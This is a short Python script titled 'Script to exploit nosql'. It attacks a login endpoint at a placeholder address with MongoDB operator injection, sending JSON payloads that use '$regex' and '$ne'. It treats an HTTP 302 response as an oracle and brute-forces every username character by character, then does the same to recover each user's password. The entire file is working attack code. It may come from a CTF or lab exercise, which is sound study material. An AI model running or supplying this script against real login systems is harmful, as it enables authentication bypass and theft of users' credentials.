'''
Script to exploit nosql
Author: Ambrotd
'''

import requests

#proxies= {'http':'http://127.0.0.1:8080'}
proxies= ''
url='http://YourIP:4000/login'


def brute_user():
    users=[]
    skip= ['*','+','.','?','|','$','^']
    headers = {'Content-type': 'application/json'}
    for startChar in range(31,127):
        found= False
        if chr(startChar) in skip:
            continue
        data ='{"username":{"$regex":"^%s.*"},"password":{"$ne":1}}' % (chr(startChar))
        r = requests.post(url, data=data, headers=headers, proxies=proxies, allow_redirects = False)
        if r.status_code != 302:
            continue
        
        user=chr(startChar)

        while not found:
            found= True
            for i in range(31,127):
                if chr(i) not in skip:
                    payload= user + chr(i)
                    data ='{"username":{"$regex":"^%s.*"},"password":{"$ne":1}}' % (payload)
                    r = requests.post(url, data=data, headers=headers, proxies=proxies, allow_redirects = False)
                    if r.status_code==302:
                        user=payload
                        print(f"[Info] User found => {user}", end='\r',flush=True)       
                        found=False
                        break
        print()
        users.append(user)
    return users

def brute_pass(user):
    skip= ['*','+','.','?','|','$','^']
    headers = {'Content-type': 'application/json'}
    found=False
    passwd=''
    while not found:
        found= True
        for i in range(31,127):
            if chr(i) not in skip:
                payload= passwd + chr(i)
                data ='{"username":"%s","password":{"$regex":"^%s.*"}}' % (user, payload)
                r = requests.post(url, data=data, headers=headers, proxies=proxies, allow_redirects = False)
                if r.status_code==302:
                    passwd=payload
                    print(f"[+]{user}, password => {passwd}", end='\r',flush=True)      
                    found=False
                    break 
    print()


def main():
    print("Mongo brute forcer")
    userlist=brute_user()
    print("Extracting passwords")
    for user in userlist:
        brute_pass(user)

if __name__ == "__main__":
    
    main()
